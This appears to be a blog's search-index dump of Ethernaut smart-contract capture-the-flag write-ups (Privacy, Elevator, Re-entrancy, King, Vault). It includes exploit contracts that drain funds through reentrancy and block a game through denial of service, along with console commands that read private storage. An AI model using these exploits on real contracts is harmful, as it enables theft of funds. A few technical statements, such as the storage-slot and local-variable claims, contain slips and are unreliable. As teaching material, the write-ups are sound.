*.,*\u0026#39;^`*.,*\u0026#39;^`*.,*\u0026#39;^`*.,*\u0026#39;^`*.,*\u0026#39;^`*.,*\u0026#39;^`*.,*\u0026#39;^ ,---/V\\ 27 `*.,*\u0026#39;^`*.,*\u0026#39;^`*.,*\u0026#39;^`*.,*\u0026#39;^`*.,*\u0026#39;^`*.,*\u0026#39;^`*.,*\u0026#39;^`*. ~|__(o.o) 28 ^`*.,*\u0026#39;^`*.,*\u0026#39;^`*.,*\u0026#39;^`*.,*\u0026#39;^`*.,*\u0026#39;^`*.,*\u0026#39;^`*.,*\u0026#39;^`*.,*\u0026#39; UU UU 29 */ 30} The contract has six state variables named locked, ID, flattening, denomination, awkwardness, and data.\nThe state variable locked is a boolean type and initialized to true. ID is a uint256 which is initialized with block.timestamp. flattening is a uint8 and it is initialized with 10. denomination is a uint8 and it is initialized with 255. awkwardness is a uint16 and it is initialized with block.timestamp converted into uint16. data is a bytes32 array of length 3.\nAt this point, block.timestamp will return a 4-byte number. The awkwardness variable stores 2 bytes of block.timestamp, which means out of 4 bytes, only 2 bytes will be stored in awkwardness, i.e., the last two bytes will be stored in awkwardness.\nIf block.timestamp is 0x0000000000000000000000000000000000000000000000000000000066f6e2d4, the bytes2 of block.timestamp will return 0xe2d4.\n1constructor(bytes32[3] memory _data) { 2 data = _data; 3} The constructor takes a bytes32 array of length 3 as an argument. Then this array is initialized to the data variable.\n1function unlock(bytes16 _key) public { 2 require(_key == bytes16(data[2])); 3 locked = false; 4} The function unlock() is a public function that takes an argument of type bytes16 as input. Then it compares the bytes16 passed and the bytes16 of the 3rd element in the data array. If both are the same, then locked will become false.\nKey Concepts to Understand Please go through the Vault write-up if you don\u0026rsquo;t know anything about storage layout because I won\u0026rsquo;t be explaining the storage layout here.\nIn the Vault challenge WriteUp, I have clearly explained the basics of storage slots. Click here to open the WriteUp of Vault.\nNow I will explain how arrays are stored in EVM. There are two types of arrays in Solidity: fixedArray and dynamicArray. The two types of arrays will be stored in EVM using different methods. Check out the example below to learn how it works.\n1 2contract Array_Storage_Layout{ 3 uint256 private num=10; 4 bool private a=true; 5 uint256[3] private num_fixedArray=[1,2,3]; 6 uint256[] private num_dynamicArray=[1,2,3]; 7 uint128 private num_1=100; 8 9 function addElement_num_dynamicArray(uint256 _num)public{ 10 num_dynamicArray.push(_num); 11 } 12} Storage slot 0 contains the variable num, slot 1 contains the variable a.\nNow if we check slot 2, it should store the num_fixedArray, but since it is a fixed array, each element of the array is stored in one slot. Which means slot 2 contains num_fixedArray[0], slot 3 contains num_fixedArray[1], and slot 4 contains num_fixedArray[2].\nNow if we check the next variable, it is num_dynamicArray, which is a dynamic array, meaning its length is not fixed. Since it is a dynamic array, if we assign num_dynamicArray[0] to slot 5, num_dynamicArray[1] to slot 6, and num_dynamicArray[3] to slot 7, then the last variable num_1 will be assigned to slot 8, and this will be the last slot since there are no more state variables.\nHowever the above is not the correct method because when we call the addElement_num_dynamicArray() function, it will add an element to the num_dynamicArray array. According to the storage slots of the array, the latest value should be stored in slot 8 because the last element of num_dynamicArray is stored in slot 7. But slot 8 is already assigned with num_1 before calling the function itself. This will lead to storage collisions.\nSo instead of storing the first element of the array in the slot number of the state variable, i.e., instead of storing the first element of num_dynamicArray in slot 5, it will store the length of num_dynamicArray. Then the first element of num_dynamicArray is stored at the keccak hash of slot 5 and consecutive elements in consecutive slots.\nThe storage layout for the above contract will be as follows:\nExploit If you are directly solving this challenge without solving Vault, I recommend you to go solve Vault first and then solve this challenge.\nThe challenge is to make the locked variable false. If we see the contract, the variable locked is set to false only in the unlock() function. We can call the unlock() function, but we need to pass the correct key as an argument.\nIn the unlock() function, it compares the key with the third element in the data array. The data array is a private array, which means other contracts cannot access the data array.\nWe know that even if the state variable is marked as private, we cannot get its value by interacting with the contract, but we can get the private variables by going through the storage layout of the contract. This is possible only due to the transparency of the blockchain. The state variables are stored on EVM, which is part of the blockchain. The EVM is responsible for executing smart contracts and maintaining the state of the blockchain, including the storage of state variables.\nThe storage layout of the given contract is as follows:\nNow it\u0026rsquo;s time to open the console. Open the Privacy challenge and enter ctrl+shift+j to open the console.\n1\u0026gt; await web3.eth.getStorageAt(\u0026#34;contract.address\u0026#34;,0) 2\u0026gt; await web3.eth.getStorageAt(\u0026#34;contract.address\u0026#34;,1) 3\u0026gt; await web3.eth.getStorageAt(\u0026#34;contract.address\u0026#34;,2) 4\u0026gt; await web3.eth.getStorageAt(\u0026#34;contract.address\u0026#34;,3) 5\u0026gt; await web3.eth.getStorageAt(\u0026#34;contract.address\u0026#34;,4) 6\u0026gt; await web3.eth.getStorageAt(\u0026#34;contract.address\u0026#34;,5) Try out all these and check whether they exactly match the layout I have given.\nNow we need data[2], which is stored in slot 5. The value is 0xb86abc73432c0400110ad803960273e6cc6a889bb99e10ca45ca72c7e10d3ed6. If we see the value, it is of size 32 bytes, but in the unlock() function, it is comparing the key with 16 bytes of data[2]. So the 32-byte key is explicitly converted to bytes 16.\nIn Solidity, when a bytes 32 is converted to bytes 16, it only takes the first 16 bytes. In our case, the bytes 32 is 0xb86abc73432c0400110ad803960273e6, and when it is typecasted to bytes 16, the output will be 0xb86abc73432c0400110ad803960273e6.\nNow we need to pass 0xb86abc73432c0400110ad803960273e6 as an argument to unlock(). Once we pass the value, the locked variable will become false.\n1\u0026gt; await contract.unlock(\u0026#34;0xb86abc73432c0400110ad803960273e6\u0026#34;) Now, before submitting, we need to verify whether locked is false or not.\n1\u0026gt; await contract.locked() If locked returns false, then the challenge will be solved. You can submit the instance now.\nKey Takeaways We should not store any important data in smart contracts. Even though the state variables view is private, they can be accessed by anyone.\n***Hope you enjoyed this write-up. Keep on hacking and learning!***\n","date":"October 23, 2024","img":"","lang":"en","langName":"","largeImg":"","permalink":"/blogs/ethernaut/privacy/","series":[{"title":"Ethernaut","url":"/series/ethernaut/"}],"smallImg":"","tags":[{"title":"Storage Layout","url":"/tags/storage-layout/"}],"timestamp":1729625896,"title":"Privacy"},{"authors":[],"categories":[{"title":"Blockchain","url":"/categories/blockchain/"}],"content":" Writeup for Elevator Hello h4ck3r, welcome to the world of smart contract hacking. Solving the challenges from Ethernaut will help you understand Solidity better. For each challenge, a contract will be deployed, and an instance will be provided. Your task is to interact with the contract and exploit its vulnerabilities. Don\u0026rsquo;t worry if you are new to Solidity and have never deployed a smart contract before. You can learn how to deploy a contract using Remix here. Challenge Description This elevator won\u0026rsquo;t let you reach the top of your building. Right?\nContract Explanation Click to view source contract // SPDX-License-Identifier: MIT pragma solidity ^0.8.0;\ninterface Building { function isLastFloor(uint256) external returns (bool); }\ncontract Elevator { bool public top; uint256 public floor;\nfunction goTo(uint256 _floor) public { Building building = Building(msg.sender); if (!building.isLastFloor(_floor)) { floor = _floor; top = building.isLastFloor(floor); } } }\nIf you feel like you understand the contract, you can move to the exploit part. If you are a beginner, please go through the Contract Explanation as well. It will help you understand Solidity better.\nIf we see the code, we can observe an interface named Building and a contract named Elevator.\nIn a Solidity contract, an interface is a list of function definitions without implementation. This can be used when we want to interact with deployed contracts. Observe the following example to understand more.\n1 2contract deployed_Contract{ 3 uint8 Number=10; 4 function increment_Number()public { 5 Number++; 6 } 7 8 function change_Number(uint8 num)public{ 9 Number=num; 10 } 11 12} Assume that we have deployed this contract. Now somehow we need to interact with this contract. Observe the below code.\n1 2interface Ideployed_Contract{ 3 function increment_Number() external; 4 function change_Number(uint8) external; 5} 6 7contract interact_With_deployed_Contract{ 8 Ideployed_Contract I_deployedContract; 9 constructor(address _addr){ 10 I_deployedContract=Ideployed_Contract(_addr); 11 } 12 13 function increment()public{ 14 I_deployedContract.increment_Number(); 15 } 16 17 function change(uint8 _num)public{ 18 I_deployedContract.change_Number(_num); 19 } 20} In the above example, assume the first contract is already deployed and we want to interact with the contract. Using the above interface, we can interact with the first deployed contract. The interface will basically say that these are the functions existing on the deployed contract. Try this out in Remix.\n1interface Building { 2 function isLastFloor(uint256) external returns (bool); 3} The above is the interface of a Building contract, which means the Building contract should have the isLastFloor() function because using the interface, we are interacting with the contract. If the function doesn\u0026rsquo;t exist in the building contract, it will revert.\nIn the Elevator contract, there are two state variables: top and floor. These variables are just declared in the contract but they weren\u0026rsquo;t initialized in the contract. So initially, the top and floor values are set to false and zero, respectively.\n1function goTo(uint256 _floor) public { 2 Building building = Building(msg.sender); 3 4 if (!building.isLastFloor(_floor)) { 5 floor = _floor; 6 top = building.isLastFloor(floor); 7 } 8 } The function goTo() is a public function that takes a uint256 as an argument. The function declares a variable named building of type Building, which is the interface. It initializes building with the Building type at the address of msg.sender. This means that the msg.sender should be a contract.\nThen the function makes a call to isLastFloor() in the Building contract (msg.sender contract). If it returns true, then the following lines won\u0026rsquo;t execute. If it returns false, the following lines will execute.\nIn the next line, the floor variable is set to the argument passed into the goTo() function during the call. Then again, the function makes a call to isLastFloor() in the Building contract (msg.sender contract) and sets the return value to the top variable.\nExploit Here our task is to make the top variable true. Once we set the top variable to true, this challenge will be solved.\nIf we see the contract, the only place where the value of top is changed is in the goTo() function. So we need to interact with the goTo() function.\nWe should interact with the contract using another contract. In order to do that, we need to write a contract that includes the isLastFloor() function. This is because when we make a call to the goTo() function in the Elevator contract, the function sets the building variable using the interface of Building with the address as msg.sender.\nBut if we check the goTo() function, in order to enter the if condition and pass the condition, our isLastFloor() function should return false. Also, once it passes the if condition, it also sets top by making one more call to the isLastFloor() function. Since our task is to make top true, the second time our function is called, our function should return true.\nSo somehow we need to write logic such that when the Elevator contract first makes a call to isLastFloor() in our contract, it should return false, and the second time it should return true.\nClick to view Exploit contract 1// SPDX-License-Identifier: MIT 2pragma solidity ^0.8.0; 3 4import {Elevator} from \u0026#34;../src/contracts/Elevator.sol\u0026#34;; 5 6contract ExploitElevator { 7 Elevator elevator; 8 bool top = true; 9 10 constructor(address _addr) { 11 elevator = Elevator(_addr); 12 } 13 14 function isLastFloor(uint256) public returns (bool) { 15 top = !top; 16 return top; 17 } 18 19 function Exploit() public { 20 elevator.goTo(100); 21 } 22} 1function isLastFloor(uint256) public returns (bool) { 2 top = !top; 3 return top; 4} The main logic of the exploit contract is only this function. In the contract, I have declared a bool variable named top and initialized it to true. So when the isLastFloor() is called, top will become false, then it will return top (false). Then the next time isLastFloor() is called, top is set to true, and then it will return top (true).\nWhen you deploy the Exploit contract, pass the address of the Elevator contract as an argument to constructor() and call the Exploit() function. Once the call is done, the challenge will be solved.\nKey Takeaways Do not rely on external contract calls for critical logic, as they can be manipulated. Ensure that important conditions and state changes are handled within the contract itself.\n***Hope you enjoyed this write-up. Keep on hacking and learning!***\n","date":"October 23, 2024","img":"","lang":"en","langName":"","largeImg":"","permalink":"/blogs/ethernaut/elevator/","series":[{"title":"Ethernaut","url":"/series/ethernaut/"}],"smallImg":"","tags":[{"title":"Control Flow Manipulation","url":"/tags/control-flow-manipulation/"}],"timestamp":1729625858,"title":"Elevator"},{"authors":[],"categories":[{"title":"Blockchain","url":"/categories/blockchain/"}],"content":" Writeup for Re-entrancy Hello h4ck3r, welcome to the world of smart contract hacking. Solving the challenges from Ethernaut will help you understand Solidity better. For each challenge, a contract will be deployed, and an instance will be provided. Your task is to interact with the contract and exploit its vulnerabilities. Don\u0026rsquo;t worry if you are new to Solidity and have never deployed a smart contract before. You can learn how to deploy a contract using Remix here. Challenge Description The goal of this level is for you to steal all the funds from the contract.\nThings that might help:\nUntrusted contracts can execute code where you least expect it. Fallback methods Throw/revert bubbling Sometimes the best way to attack a contract is with another contract. See the \u0026ldquo;?\u0026rdquo; page above, section \u0026ldquo;Beyond the console\u0026rdquo; Contract Explanation Click to view source contract 1// SPDX-License-Identifier: MIT 2pragma solidity ^0.6.12; 3 4import \u0026#34;./SafeMath.sol\u0026#34;; 5 6contract Reentrance { 7 using SafeMath for uint256; 8 9 mapping(address =\u0026gt; uint256) public balances; 10 11 function donate(address _to) public payable { 12 balances[_to] = balances[_to].add(msg.value); 13 } 14 15 function balanceOf(address _who) public view returns (uint256 balance) { 16 return balances[_who]; 17 } 18 19 function withdraw(uint256 _amount) public { 20 if (balances[msg.sender] \u0026gt;= _amount) { 21 (bool result,) = msg.sender.call{value: _amount}(\u0026#34;\u0026#34;); 22 if (result) { 23 _amount; 24 } 25 balances[msg.sender] -= _amount; 26 } 27 } 28 29 receive() external payable {} 30} Click to view SafeMath contract 1pragma solidity ^0.4.23; 2 3/** 4 * @title SafeMath 5 * @dev Math operations with safety checks that throw on error 6 */ 7library SafeMath { 8 /** 9 * @dev Multiplies two numbers, throws on overflow. 10 */ 11 function mul(uint256 a, uint256 b) internal pure returns (uint256 c) { 12 if (a == 0) { 13 return 0; 14 } 15 c = a * b; 16 assert(c / a == b); 17 return c; 18 } 19 20 /** 21 * @dev Integer division of two numbers, truncating the quotient. 22 */ 23 function div(uint256 a, uint256 b) internal pure returns (uint256) { 24 // assert(b \u0026gt; 0); // Solidity automatically throws when dividing by 0 25 // uint256 c = a / b; 26 // assert(a == b * c + a % b); // There is no case in which this doesn\u0026#39;t hold 27 return a / b; 28 } 29 30 /** 31 * @dev Subtracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend). 32 */ 33 function sub(uint256 a, uint256 b) internal pure returns (uint256) { 34 assert(b \u0026lt;= a); 35 return a - b; 36 } 37 38 /** 39 * @dev Adds two numbers, throws on overflow. 40 */ 41 function add(uint256 a, uint256 b) internal pure returns (uint256 c) { 42 c = a + b; 43 assert(c \u0026gt;= a); 44 return c; 45 } 46} If you feel like you understand the contract, you can move to the exploit part. If you are a beginner, please go through the Contract Explanation as well. It will help you understand Solidity better.\nSince the contract version is less than 0.8.0, they are using the SafeMath library to prevent overflows and underflows.\nThe contract stores balances of people who donated to the contract using a mapping from address to uint256, stored in a variable called balances.\n1function donate(address _to) public payable { 2 balances[_to] = balances[_to].add(msg.value); 3} The function donate() is a public payable function, which means it will accept sending ether during the function call. It takes an argument of type address. In the logic, it updates the balances of the address passed as an argument with the ether sent during the call.\n1function balanceOf(address _who) public view returns (uint256 balance) { 2 return balances[_who]; 3} The function balanceOf() is a public view function, which means it only reads from the contract. It takes an argument of type address and returns the balance of the address passed as an argument.\n1function withdraw(uint256 _amount) public { 2 if (balances[msg.sender] \u0026gt;= _amount) { 3 (bool result,) = msg.sender.call{value: _amount}(\u0026#34;\u0026#34;); 4 if (result) { 5 _amount; 6 } 7 balances[msg.sender] -= _amount; 8 } 9} The function withdraw() is a public function. It takes an argument of type uint256. The function checks if the msg.sender (caller) has enough balance. If the caller has enough balance, it transfers the specified amount of ether to the caller using a low-level call. After the call, it reduces the balance of the caller.\n1receive() external payable {} The function receive() is a special function in Solidity. It is triggered when someone sends ether to the contract without calling any other function in the contract. There is no logic in this function; it simply accepts ether payments without making any state changes.\nExploit Before getting started with the exploit, I wanted to ask a question. What is the name of the challenge? REENTRANCY!! What does REENTRANCY mean? Basically entering again and again.\nIf we observe the withdraw() function, when someone calls the withdraw function, it transfers the ether and then updates the balance. But how is it transferring the ether and updating the balance?\nIt is transferring the ether using the low-level call function. When transferring ether using a low-level call, if the receiver is an Externally Owned Account (EOA) account, the account will receive the ether. However, if the receiver is a contract account, the contract will only receive the ether if it has a receive() function. If there is no receive() function, the ether won\u0026rsquo;t be transferred.\nreceive() is a function where we can write some logic. Now, let\u0026rsquo;s assume we made some deposits for a contract that we deployed, and we called the withdraw() function using our contract. It will check if there is a receive() function or not. If there is a receive() function in our deployed contract, our contract will successfully receive the ether and our balance will be updated.\nNow, what if we write some logic in our contract\u0026rsquo;s receive() function to call the withdraw() function again? The withdraw() function will be called again before updating the balances of our first withdraw call, which means we still have the balances even after withdrawing. The checks in the withdraw() function for the second call will be passed, and our contract will receive the ether again. This process can continue indefinitely, but we will encounter an out of gas error.\nThe out of gas error occurs because, in a transaction, we can use a maximum of 3 million gas. If we use more gas than the limit, we will get an error. As the logic we wrote creates an infinite loop, we need to change it so that we just drain the contract.\nAnother thing to consider is that the balance is updated after the calls. Let\u0026rsquo;s assume in our receive() function, we just write the logic to call the withdraw() function twice. The calls will be as follows:\nThe key point to understand in the flowchart is that the balance is updated at last and it is updated twice. Suppose we have 1 ether and we withdraw 1 ether in each call. At last, our balance will be reduced twice. When it reduces the first time, our balance will be zero, and the next time it reduces, there should be an underflow or revert if the underflow is handled properly. If it reverts, all the state changes made will be reverted.\nIf we check the Reentrance contract, the compiler version is less than 0.8.0, which means the contract is vulnerable to overflows and underflows. However, they are using the SafeMath library to overcome the vulnerabilities of overflows and underflows. If we check the donate() function, they have properly implemented the SafeMath library. But if we check the withdraw() function, they didn\u0026rsquo;t use the SafeMath library to reduce the caller\u0026rsquo;s balance. The correct syntax for implementing SafeMath for subtraction is balances[msg.sender].sub(_amount).\nSo, as they didn\u0026rsquo;t use SafeMath during the second call while updating the balance, it will lead to an underflow, and our balance will be set to (2^256 - 1). With these two vulnerabilities, we can withdraw twice the amount of our balance in the Reentrancy contract.\nNote: I have written logic to withdraw twice, but it is not limited to that. We can withdraw as many times as we want as long as the contract has a balance.\nNow our task is to know the balance of the contract, then donate ether worth the Reentrancy contract balance to our Exploit contract, and use the contract to call the withdraw() function.\nNow, it\u0026rsquo;s time to open the console. Open the Reentrancy challenge and press ctrl+shift+j to open the console.\n1\u0026gt; await web3.eth.getBalance(contract.address) This will return the balance of the Reentrance contract. The balance of the Reentrance contract is 1000000000000000 wei.\nNow we need to write an Exploit contract.\nClick to view Exploit contract 1// SPDX-License-Identifier: MIT 2pragma solidity ^0.6.12; 3 4import {Reentrance} from \u0026#34;../src/contracts/Reentrance.sol\u0026#34;; 5 6contract ExploitReentrancy { 7 Reentrance public reentrance; 8 uint8 check = 0; 9 10 constructor(address payable _reentrance) public { 11 reentrance = Reentrance(_reentrance); 12 } 13 14 function attack() public payable { 15 reentrance.donate{value: 1000000000000000}(address(this)); 16 reentrance.withdraw(1000000000000000); 17 } 18 19 function withdraw(address _myaddress) public { 20 payable(_myaddress).transfer(address(this).balance); 21 } 22 23 receive() external payable { 24 if (check \u0026lt; 1) { 25 check++; 26 reentrance.withdraw(1000000000000000); 27 } 28 } 29} To completely drain the Reentrance contract, we need to call the Exploit() function. Once we call the Exploit(), the Reentrance contract balance will become zero, and our Exploit contract balance will become 2000000000000000 wei or 0.002 ether.\nLastly, don\u0026rsquo;t forget to withdraw 0.002 ether from the Exploit contract to your EOA.\nThat\u0026rsquo;s it! Now we can submit the instance.\nKey Takeaways When our contract logic involves sending ether based on balances, we must adopt the CEI pattern (Checks, Effects, Interactions). First, check for the balance, update the balance, and then proceed with the transfer. Compare the below and try to understand the difference.\n***Hope you enjoyed this write-up. Keep on hacking and learning!***\n","date":"October 23, 2024","img":"","lang":"en","langName":"","largeImg":"","permalink":"/blogs/ethernaut/reentrancy/","series":[{"title":"Ethernaut","url":"/series/ethernaut/"}],"smallImg":"","tags":[{"title":"Re-Entrancy","url":"/tags/re-entrancy/"}],"timestamp":1729625678,"title":"ReEntrancy"},{"authors":[],"categories":[{"title":"Blockchain","url":"/categories/blockchain/"}],"content":" Writeup for King Hello h4ck3r, welcome to the world of smart contract hacking. Solving the challenges from Ethernaut will help you understand Solidity better. For each challenge, a contract will be deployed, and an instance will be provided. Your task is to interact with the contract and exploit its vulnerabilities. Don\u0026rsquo;t worry if you are new to Solidity and have never deployed a smart contract before. You can learn how to deploy a contract using Remix here. Challenge The contract below represents a very simple game: whoever sends an amount of ether that is larger than the current prize becomes the new king. On such an event, the overthrown king gets paid the new prize, making a bit of ether in the process! It\u0026rsquo;s as ponzi as it gets xD\nYour goal is to break this game.\nWhen you submit the instance back to the level, the level is going to reclaim kingship. You will beat the level if you can avoid such a self-proclamation.\nContract Explanation Click to view source contract 1// SPDX-License-Identifier: MIT 2pragma solidity ^0.8.0; 3 4contract King { 5 address king; 6 uint256 public prize; 7 address public owner; 8 9 constructor() payable { 10 owner = msg.sender; 11 king = msg.sender; 12 prize = msg.value; 13 } 14 15 receive() external payable { 16 require(msg.value \u0026gt;= prize || msg.sender == owner); 17 payable(king).transfer(msg.value); 18 king = msg.sender; 19 prize = msg.value; 20 } 21 22 function _king() public view returns (address) { 23 return king; 24 } 25} If you feel like you understand the contract, you can move to the exploit part. If you are a beginner, please go through the Contract Explanation as well. It will help you understand Solidity better.\nThe contract has three state variables: king, prize, and owner. king represents the address of the current king, prize represents the ether sent by a person to become the king, and owner represents the owner of this contract.\n1constructor() payable { 2 owner = msg.sender; 3 king = msg.sender; 4 prize = msg.value; 5 } The constructor initializes owner and king to msg.sender, and prize to msg.value. Initially, the deployer of the contract will be the king and owner of this contract.\n1receive() external payable { 2 require(msg.value \u0026gt;= prize || msg.sender == owner); 3 payable(king).transfer(msg.value); 4 king = msg.sender; 5 prize = msg.value; 6 } The receive() function is a special function in Solidity. It will be triggered when you send some ether to the contract without calling any function.\nIn the function logic, it checks if the msg.value (ether) sent during the call is greater than or equal to the prize of the current king, or if the msg.sender (caller) is the owner of the contract. If either of these conditions is true, the execution continues, otherwise, it reverts.\nThen, it transfers the ether deposited by the old king to the old king because once the require() statement is passed, the king will be changed. So, when the king changes, the old king needs to receive the amount of ether deposited by them to become king. Once the transfer is done, the king is set to msg.sender (caller) and the prize is set to msg.value (the ether deposited by the new king).\nThe function _king() is a public view function that returns the address of the current king.\nExploit The contract works based on a simple logic: whoever sends more ether than the current king becomes the new king, and the contract sends the amount of ether deposited by the old king to them.\nIf we become the king using an Externally Owned Account (EOA), everything works as normal. However, if we make a smart contract become the king, the King contract will work as expected only if the contract is able to receive the ether when a new person becomes the king.\nWe know that a contract can receive ether in two ways: one way is through defining a normal payable function, and the other way is by having a receive() function. See the example below to understand.\n1 2contract Receive_Ether { 3 4 function Receive_ether() public payable { 5 // This function allows the contract to receive Ether when it is called. 6 // The \u0026#39;payable\u0026#39; keyword is necessary for the function to accept Ether. 7 // If the function is not marked as \u0026#39;payable\u0026#39;, any attempt to send Ether will cause the transaction to revert. 8 9 // The logic of this function can be anything. The contract will receive ether irrespective of the logic. 10 } 11 12 receive() external payable { 13 // This receive() function allows the contract to receive Ether when it is sent directly to the contract address. 14 // This function is called when no other function matches the call data. 15 } 16} Now, if we create an exploit contract without a receive() function and make the contract the king, the challenge will be solved.\nClick to view Exploit contract 1// SPDX-License-Identifier: MIT 2pragma solidity ^0.8.0; 3 4import {King} from \u0026#34;../src/contracts/King.sol\u0026#34;; 5 6contract ExploitKing { 7 King public king; 8 9 constructor(address payable _king) { 10 king = King(_king); 11 } 12 13 function Exploit() public payable { 14 (bool success,) = address(king).call{value: msg.value}(\u0026#34;\u0026#34;); 15 require(success, \u0026#34;Exploit Failed\u0026#34;); 16 } 17} Now, we just need to deploy the contract and call the Exploit() function with some ether.\n1function Exploit() public payable { 2 (bool success,) = address(king).call{value: msg.value}(\u0026#34;\u0026#34;); 3 require(success, \u0026#34;Exploit Failed\u0026#34;); 4} Our task is to know the amount of ether deposited by the current king and send more ether than the current king.\nNow, it\u0026rsquo;s time to open the console. Open the King challenge and press ctrl+shift+j to open the console.\n1\u0026gt; (await contract.prize()).toString() This will return the ether deposited by the current king, which is 1000000000000000 wei. We need to send more than 1000000000000000 wei to become the king. We can send 1000000000000001 wei to become the king.\nOpen Remix and deploy the exploit contract. When calling the Exploit() function, we need to send 1000000000000001 wei.\nWe can find the VALUE section in the Remix deployment options. We need to enter 1000000000000001 in the VALUE field and call the Exploit() function.\nThat\u0026rsquo;s it! Once we call the Exploit() function, the challenge will be solved.\nKey Takeaways When writing a contract, if the logic depends on sending Ether We need to ensure that, it is sent to an Externally Owned Account (EOA).\nIn this challenge, we can fix this exploit by checking if tx.origin is msg.sender .\n1 receive() external payable { 2 require(tx.origin==msg.sender); 3 require(msg.value \u0026gt;= prize || msg.sender == owner); 4 payable(king).transfer(msg.value); 5 king = msg.sender; 6 prize = msg.value; 7 } ***Hope you enjoyed this write-up. Keep on hacking and learning!***\n","date":"October 23, 2024","img":"","lang":"en","langName":"","largeImg":"","permalink":"/blogs/ethernaut/king/","series":[{"title":"Ethernaut","url":"/series/ethernaut/"}],"smallImg":"","tags":[{"title":"Denial of Service","url":"/tags/denial-of-service/"}],"timestamp":1729625619,"title":"King"},{"authors":[],"categories":[{"title":"Blockchain","url":"/categories/blockchain/"}],"content":" Writeup for Vault Hello h4ck3r, welcome to the world of smart contract hacking. Solving the challenges from Ethernaut will help you understand Solidity better. For each challenge, a contract will be deployed and its instance will be provided. Your task is to interact with the contract and exploit its vulnerabilities. Don\u0026rsquo;t worry if you are new to Solidity and have never deployed a smart contract before. You can learn how to deploy a contract using Remix here. Challenge The goal of this level is to unlock the vault and pass the challenge! Contract Explanation Click to view source contract 1// SPDX-License-Identifier: MIT 2pragma solidity ^0.8.0; 3 4contract Vault { 5 bool public locked; 6 bytes32 private password; 7 8 constructor(bytes32 _password) { 9 locked = true; 10 password = _password; 11 } 12 13 function unlock(bytes32 _password) public { 14 if (password == _password) { 15 locked = false; 16 } 17 } 18} If you feel like you understand the contract, you can move to the exploit part. If you are a beginner, please go through the Contract Explanation as well. It will help you understand Solidity better.\nThe contract has two state variables: locked and password. locked is a boolean variable and it is initialized to true in the constructor. password is a bytes32 variable and it is initialized to a bytes32 value in the constructor.\n1constructor(bytes32 _password) { 2 locked = true; 3 password = _password; 4} The constructor initializes the locked variable to true and the password variable to the value of _password, which is an argument to the constructor.\n1function unlock(bytes32 _password) public { 2 if (password == _password) { 3 locked = false; 4 } 5} The function unlock() is a public function that takes a bytes32 _password as an argument. If the value of _password matches the value of password, the function sets the locked variable to false.\nExploit By looking into the code, we can see that we can unlock the vault by calling the unlock() function with the password as an argument.\nWe can see that the password is a private variable, which means it can only be accessed by functions within the contract. It is not visible to outside contracts. So we can\u0026rsquo;t know the password value by interacting with the contract. If we check the ABI, we cannot find the password because its visibility is restricted to only that contract. If it were public, anyone outside the contract could interact with the contract and know the password.\nNow it\u0026rsquo;s time to open the console. Open the Vault challenge and press ctrl+shift+j to open the console.\n1\u0026gt; contract.abi In the ABI, we can\u0026rsquo;t find the password. So now how can we get the password?\nNow for a moment, let\u0026rsquo;s come out of this challenge and think about what blockchain is and what is so special about blockchain.\nYou are right!! It\u0026rsquo;s immutability and transparency. The entire data of a blockchain is public and anyone will be able to see any transaction in the blockchain.\nNow let\u0026rsquo;s discuss the different types of variables in Solidity. There are three types of variables in Solidity.\nState Variables: Variables whose values are permanently stored in a contract storage. Local Variables: Variables whose values are present till the function is executing. Global Variables: Special variables that exist in the global namespace used to get information about the blockchain. Check the below contract to understand the different types of variables.\n1contract Variables{ 2 uint256 State_number; // State Variable which means it is stored permanently in blockchain 3 4 function set_State_number(uint256 _num)public{ 5 uint256 _temp=_num; // Local variable which means the _temp value will be stored in memory and 6 // Once function execution completes the storage of _temp will be freed. 7 State_number=_temp; 8 } 9 10 function get_blockhash()public returns(bytes32){ 11 return blockhash(block.number-1); 12 /*blockhash is a global variable. for simpler understanding assume global variables as a function which 13 * is not defined by you but you can use it anywhere in the contract. 14 */ 15 } 16} Now let\u0026rsquo;s understand where these variables are stored. Local variables are stored in memory, which is a temporary storage. Once the function execution completes, the memory storage given to a particular local variable will be freed.\nState variables are stored in the contract\u0026rsquo;s permanent storage, unlike local variables stored in memory. To be more clear, let\u0026rsquo;s assume the contract has two kinds of storage: permanent storage and temporary storage. State variables are stored in permanent storage and local variables are stored in permanent storage.\nNow let\u0026rsquo;s dive into how state variables storage works. Assume you have a book containing 200 pages and you have written some important data on the 100th page. The next day you want to see the data, how are you going to refer to that data? Will you go from page 1 to page 100 and check for data, or will you directly open the 100th page since you know the data is stored on the 100th page? Obviously, you will directly open the 100th page and check for data.\nThe same way, just like pages in a book, we have storage slots in EVM. A page in a book contains a certain number of lines to be filled, and in storage slots, we can store a maximum of 32 bytes. In a page, you may or may not fill all the lines, same way here the storage slot may or may not contain a full 32 bytes of data. Suppose you have a large amount of data to be stored that cannot be filled in one single page, then how are you going to write? You will write whatever data fills this page and write the remaining data in another page. Same way, we store large amounts of data in different slots, but it won\u0026rsquo;t be the same as how we write in a book, it will be different. I will be explaining it in the coming challenges.\nSo, as far as we understood, EVM stores state variables in storage slots. So, if there is some data stored in one of the slots, how can you get that particular data? We can get that data by using the key. The key is basically the slot number. Just like an array has indexes from 0, storage slots also start from 0. The first 32 bytes of data will be stored in slot 0, and the next 32 bytes will be stored in slot 2, etc. Check the following example.\n1contract Storage_slots{ 2 bool boolean=true; // 1 byte 3 uint256 number=256; //32 bytes 4 uint128 number1=100; //16 bytes 5 uint128 number2=101; //16 bytes 6 7 //1 byte=8bits 8 //uint256=256 bits =32 bytes 9 10 //slot 0: boolean 11 //slot 1: number 12 //slot 2: number1,number2 13} Now, if we check the state variables of the contract, the first variable is locked, which is of type bool, and the second state variable is password, which is of type bytes32. So, locked will be stored in the 0th slot, and password will be stored in the 1st slot.\nThe web3 library has a function named getStorageAt() that takes the contract address and slot number as arguments and returns the value at the slot.\nOur challenge is to unlock the vault. If we know the password, we can unlock the vault. Enter the following:\n1\u0026gt; await web3.eth.getStorageAt(contract.address,1) Now, once we get the password, we need to call the unlock() function by passing the password as an argument to unlock().\n1\u0026gt; await contract.unlock(\u0026#34;0x412076657279207374726f6e67207365637265742070617373776f7264203a29\u0026#34;) We can verify whether the vault is unlocked or not by calling locked().\n1\u0026gt; await contract.locked() That\u0026rsquo;s it! The challenge is solved. Now we just need to submit the challenge.\nKey Takeaways We should not store any important data in smart contracts. Even though the state variables view is private, it can be accessed by anyone.\n***Hope you enjoyed this write-up. Keep on hacking and learning!***\n","date":"October 23, 2024","img":"","lang":"en","langName":"","largeImg":"","permalink":"/blogs/ethernaut/vault/","series":[{"title":"Ethernaut","url":"/series/ethernaut/"}],"smallImg":"","tags":[{"title":"Storage 